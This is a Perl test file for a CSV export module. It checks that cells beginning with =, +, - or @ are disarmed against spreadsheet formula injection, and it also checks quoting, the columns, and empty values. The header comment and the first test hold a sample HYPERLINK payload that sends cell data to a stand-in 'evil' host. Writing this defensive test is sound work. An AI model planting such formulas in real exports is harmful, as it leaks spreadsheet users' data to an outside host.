#!/usr/bin/perl
# DM-2: the table as a file, and the one way a download can hurt somebody.
#
# A SPREADSHEET RUNS CELLS THAT START WITH `=`, `+`, `-` OR `@`. So a row
# containing
#
#     =HYPERLINK("http://evil/?"&A1,"Click me")
#
# is executable content the moment the operator opens the file - and since
# DP-4, rows can arrive from a PUBLIC FORM. An anonymous visitor can put that
# string in a table, and the person who downloads it is the site's owner.
#
# Quoting does not help: a spreadsheet unquotes first and parses after. The
# accepted mitigation is to prefix the cell with a single quote, and it must be
# said plainly that THIS CHANGES THE VALUE - which is why the typed JSON export
# exists beside it and alters nothing.
use strict;
use warnings;
use Test::More;
use FindBin;
use lib "$FindBin::Bin/../../lib";

BEGIN {
    eval { require YAML::PP; 1 } or plan skip_all => 'YAML::PP not available';
}
use Lazysite::Data::Csv        qw(to_csv csv_columns);
use Lazysite::Data::Descriptor qw(load_descriptor);

my $d = load_descriptor(
    'works',
    {   key    => 'code',
        fields => {
            code  => { type => 'text' },
            title => { type => 'text' },
            price => { type => 'decimal', digits => 8, places => 2 },
        },
    }
);
ok( $d->{ok}, 'the fixture descriptor loads' ) or BAIL_OUT( $d->{error} );

subtest 'A CELL THAT WOULD RUN IS DISARMED' => sub {
    my ( $csv, $guarded ) = to_csv(
        $d,
        [   { code => 'W1', title => '=HYPERLINK("http://evil/","x")' },
            { code => 'W2', title => '+1+1' },
            { code => 'W3', title => '-2+3' },
            { code => 'W4', title => '@SUM(A1:A9)' },
        ]
    );

    unlike( $csv, qr/(^|,|")=HYPERLINK/m, 'no cell still begins with =' )
        or diag( 'This is executable content in the operator\'s spreadsheet, '
            . 'and since DP-4 an anonymous visitor can put it there.' );
    like( $csv, qr/'=HYPERLINK/, 'it is prefixed rather than dropped' )
        or diag( 'Dropping the value would lose data. Prefixing marks it.' );

    for my $lead ( '+', '-', '@' ) {
        like( $csv, qr/'\Q$lead\E/, "a leading '$lead' is disarmed too" );
    }

    is( $guarded, 4, 'and the count of altered cells is reported' )
        or diag( 'An operator who is not told how many cells changed finds '
            . 'out in a diff, if at all.' );
};

subtest 'an ordinary value is left exactly alone' => sub {
    my ( $csv, $guarded ) = to_csv( $d,
        [ { code => 'W1', title => 'Sunrise', price => '10.50' } ] );
    like( $csv, qr/\bSunrise\b/, 'text is untouched' );
    unlike( $csv, qr/'Sunrise/, 'and not needlessly quoted' );
    is( $guarded, 0, 'nothing was altered' )
        or diag( 'A guard that fires on safe values trains people to ignore '
            . 'the count.' );

    like( $csv, qr/10\.50/, 'a decimal keeps its trailing zero' )
        or diag( 'Money that loses a place on the way to a spreadsheet is the '
            . 'exact bug the decimal type exists to prevent.' );
};

subtest 'the format is CSV, not nearly-CSV' => sub {
    my ($csv) = to_csv(
        $d,
        [   { code => 'W1', title => 'Smith, John' },
            { code => 'W2', title => 'He said "no"' },
            { code => 'W3', title => "two\nlines" },
        ]
    );
    like( $csv, qr/"Smith, John"/,   'a comma forces quoting' );
    like( $csv, qr/"He said ""no"""/, 'an embedded quote is doubled' );
    like( $csv, qr/"two\nlines"/,     'a newline is quoted, not stripped' );
    like( $csv, qr/\r\n\z/,           'and the file ends with a terminator' );
};

subtest 'the columns come from the descriptor' => sub {
    my @cols = csv_columns($d);
    is( $cols[0], 'code', 'the key comes first - it identifies the row' );
    ok( ( grep { $_ eq 'price' } @cols ), 'a declared field is a column' );

    # A column no row has filled is STILL a column. A header that appears and
    # disappears with the data is worse than a wide file: it reads as loss.
    my ($csv) = to_csv( $d, [ { code => 'W1' } ] );
    like( $csv, qr/price/, 'even when every row leaves it empty' );
};

subtest 'CSV cannot tell absent from empty, and does not pretend to' => sub {
    my ($csv) = to_csv( $d,
        [ { code => 'W1', title => undef }, { code => 'W2', title => '' } ] );
    # COMPARED WITHOUT THE KEY, which is the one column that is SUPPOSED to
    # differ. The first version compared whole lines and failed on 'W1' vs
    # 'W2' - a test measuring the thing it had arranged to vary.
    my @lines = split /\r\n/, $csv;
    my @rest  = map { my $l = $_; $l =~ s/\A[^,]*,//; $l } @lines[ 1, 2 ];
    is( $rest[0], $rest[1],
        'both become an empty field, identically' )
        or diag( 'Inventing a marker for one of them would be a convention '
            . 'every reader guesses at differently. The typed JSON export is '
            . 'the one that keeps them apart.' );
};

done_testing();
